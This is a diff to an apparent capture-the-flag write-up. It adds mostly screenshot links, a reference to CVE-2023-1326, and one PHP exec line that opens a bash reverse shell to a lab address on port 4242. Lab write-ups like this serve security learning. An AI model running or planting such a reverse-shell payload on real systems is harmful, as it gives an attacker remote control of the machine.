@@ -108,6 +108,18 @@ Systems -> Extensions
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/ff6dcd8d-7218-4369-8e88-586c60bf182f)
 
+`exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.62/4242 0>&1'");`
 
+![image](https://github.com/zer00d4y/writeups/assets/128820441/b4b5d4e4-1b28-4492-93e4-fcda06f5230d)
 
+![image](https://github.com/zer00d4y/writeups/assets/128820441/a5b41640-4ff2-4d0b-8658-124bbd4026ce)
 
+![image](https://github.com/zer00d4y/writeups/assets/128820441/9558c356-b5f9-4af7-bbc6-89b72f4d8b76)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/3de4ca82-f25c-46e4-b98a-a4ca7d023879)
+
+CVE-2023-1326
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/f352aeac-63d5-4dd6-be18-435d9c812e50)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/1735f766-9d1a-4245-9982-4071dc159218)
